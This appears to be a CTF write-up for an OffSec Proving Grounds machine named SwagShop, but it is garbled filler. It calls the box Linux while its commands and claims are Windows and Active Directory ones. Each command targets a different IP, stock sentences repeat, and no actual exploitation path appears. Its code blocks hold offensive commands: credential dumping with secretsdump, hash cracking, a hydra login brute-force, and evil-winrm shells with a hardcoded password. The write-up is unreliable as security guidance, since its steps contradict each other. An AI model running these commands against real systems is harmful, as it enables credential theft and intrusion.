---
TitleSEO: "OffSec Proving Grounds — SwagShop (Insane Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — SwagShop (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds SwagShop. Sudo Misconfiguration and DNS Rebinding to achieve insane compromise on Linux."
Keywords: "tryhackme, hackthebox, pwntilldawn, web, offsec, linux"
URL: "https://zurefx.github.io/writeups/htb-swagshop-953.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-swagshop-953/"
Date: "2024-06-25"
Tags: "TryHackMe, HackTheBox, PwnTillDawn, Web, OffSec, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-swagshop-953"
Permalink: "/writeups/htb-swagshop-953.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **SwagShop** is rated **Insane** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.14.11.104`.

### Objectives

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.76.177.228 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.222.17
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
evil-winrm -i 10.115.254.153 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.237.49
crackmapexec smb 10.18.67.63 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

### Web Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.120.68.69 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **ACL Abuse**.

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
evil-winrm -i 10.125.202.20 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
crackmapexec smb 10.15.224.100 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p1433,8888,5986 10.13.29.189 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.55.221 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.121.5.143/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

## Summary

### Tools Used

- `sqlmap`
- `wpscan`
- `crackmapexec`
- `mimikatz`

### Key Takeaways

- Sudo Misconfiguration
- DNS Rebinding
- SSTI
- ACL Abuse
